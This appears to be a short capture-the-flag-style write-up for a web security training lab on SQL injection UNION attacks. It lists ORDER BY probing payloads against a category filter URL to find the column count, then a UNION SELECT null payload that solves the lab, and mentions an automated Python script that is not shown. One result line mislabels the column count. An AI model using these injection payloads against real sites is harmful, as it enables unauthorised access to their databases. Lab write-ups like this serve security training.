# SQL Injection Lab 07 - SQL injection UNION attack, determining the number of columns returned by the query

## Manual Solution

### 1. Access the lab in Web Security Academy
### 2. Determine the number of columns for UNION attack
   - Test: `/filter?category=Gifts' ORDER BY 1--`
   - Result: No error (at least 1 column exists)
   - Test: `/filter?category=Gifts' ORDER BY 2--`
   - Result: No error (at least 2 columns exist)
   - Test: `/filter?category=Gifts' ORDER BY 3--`
   - Result: No error (at least 2 columns exist)
   - Test: `/filter?category=Gifts' ORDER BY 4--`
   - Result: Error (confirms 3 columns)

### 3. Append injection to the URL:
   - Test: `/filter?category=Gifts' UNION SELECT null,null,null--`
   - Result: Congratulations, you solved the lab!

## Automated Solution

### 1. Download the script
### 2. Run the script with the following command: python sqli_lab_07.py -u <target_url> -p (if you want to use proxy 127.0.0.1:8080)

